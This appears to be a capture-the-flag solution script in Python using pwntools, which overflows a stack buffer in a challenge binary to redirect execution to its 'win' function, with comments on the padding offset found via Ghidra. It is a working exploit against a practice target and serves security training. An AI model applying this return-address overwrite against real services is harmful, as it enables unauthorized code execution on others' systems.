from pwn import *

path_to_binary = "./challenge/chall_9"
EXE = ELF(path_to_binary)
context.binary = EXE
context.log_level = "DEBUG"

win_address = EXE.symbols['win']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13380)
	return r

io = conn(False)
io.recvline()
io.sendline(b'bananas')

# Ghidra was used to decompile the file and find that the 50 byte buffer is actually taking up
# 62 bytes on the stack, so we need 62 bytes of padding to start. Then we add 4 bytes of padding
# between `win_address` and `0xdeadbeef` because the `win()` function expects a return address of 
# its own.
payload = 62 * b'a'
payload += p32(win_address) + b'aaaa' + p32(0xdeadbeef)

io.sendline(payload)

io.interactive()
io.close()